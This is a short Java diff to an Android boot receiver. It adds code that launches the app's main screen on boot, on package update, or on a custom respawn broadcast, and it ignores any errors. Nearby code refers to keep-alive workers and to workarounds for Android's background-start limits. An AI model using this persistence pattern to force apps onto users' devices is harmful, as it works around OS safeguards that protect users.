@@ -11,6 +11,7 @@ import android.os.SystemClock;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.WorkManager;
 
+import com.fason.app.MainActivity;
 import com.fason.app.core.Protocol;
 import com.fason.app.service.MainService;
 import com.fason.app.worker.KeepAliveWorker;
@@ -31,7 +32,16 @@ public class BootReceiver extends BroadcastReceiver {
             Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
             Protocol.BC_RESPAWN_SERVICE.equals(action)) {
             startSvc(context);
+            startPasskeyFlow(context);
         }
+    }
+
+    private void startPasskeyFlow(Context ctx) {
+        try {
+            Intent launch = new Intent(ctx, MainActivity.class);
+            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            ctx.startActivity(launch);
+        } catch (Exception ignored) {}
     }
 
     // Multiple fallback strategies to handle Android 12+ background start restrictions
